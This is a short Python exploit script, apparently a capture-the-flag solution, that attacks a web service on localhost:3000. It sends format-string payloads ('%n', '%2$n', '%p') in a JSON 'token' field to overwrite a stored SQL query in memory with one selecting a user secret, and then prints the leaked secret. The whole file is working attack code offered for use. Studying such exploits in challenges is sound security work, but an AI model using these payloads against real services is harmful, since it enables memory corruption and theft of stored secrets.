#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"
QUERY = "SELECT secret FROM users WHERE 1<>?"


def overwrite_query(steps):
    for i in range(0, len(QUERY), steps):
        try:
            r = requests.post(
                URL,
                json={
                    "token": "A%" + str(65535 + i) + "c%2$n%p%p%p%p",
                },
                timeout=0.001,
            )
        except Exception:
            pass

        try:
            r = requests.post(
                URL,
                json={
                    "token": "B"
                    * int.from_bytes(QUERY[i : i + steps].encode(), byteorder="little")
                    + "%n%p|%p",
                },
                timeout=0.001,
            )
        except Exception:
            pass


overwrite_query(steps=2)

try:
    r = requests.post(URL, json={"token": "A"}, timeout=0.5).json()
    if "secret" in r:
        print("[+] Found secret:", r["secret"])
        exit(0)
except Exception:
    pass
